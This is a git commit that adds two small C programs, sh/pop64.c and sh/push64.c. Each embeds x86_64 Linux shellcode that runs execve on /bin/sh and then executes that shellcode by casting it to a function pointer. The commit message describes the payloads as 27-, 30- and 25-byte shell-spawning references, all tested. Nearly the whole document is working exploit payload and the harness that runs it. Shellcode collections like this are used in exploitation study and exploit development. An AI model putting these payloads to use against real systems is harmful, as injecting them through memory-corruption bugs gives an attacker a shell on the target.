20b6fd9ddb93466c677053b09de8783cdaa31186
NoviceLive <rectigu@gmail.com>
2015-04-27 20:56:14 +0800

    added 27, 30 and 25 bytes /bin/sh x86_64 refs, all tested with runhex64

---
+++ sh/pop64.c
@@ -0,0 +1,14 @@
+#include <stdio.h>
+#include <string.h>
+
+int
+main(void)
+{
+  char *shellcode = "\xeb\x08\x5f\x6a\x3b\x58\x31\xc9\x0f\x05\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
+
+  printf("strlen(shellcode)=%d\n", strlen(shellcode));
+
+  ((void (*)(void))shellcode)();
+
+  return 0;
+}
---
+++ sh/push64.c
@@ -0,0 +1,14 @@
+#include <stdio.h>
+#include <string.h>
+
+int
+main(void)
+{
+  char *shellcode = "\x31\xc9\x51\x66\x68\x73\x68\x66\x68\x2f\x2f\x66\x68\x69\x6e\x66\x68\x2f\x62\x48\x89\xe7\x6a\x3b\x58\x0f\x05";
+
+  printf("strlen(shellcode)=%d\n", strlen(shellcode));
+
+  ((void (*)(void))shellcode)();
+
+  return 0;
+}
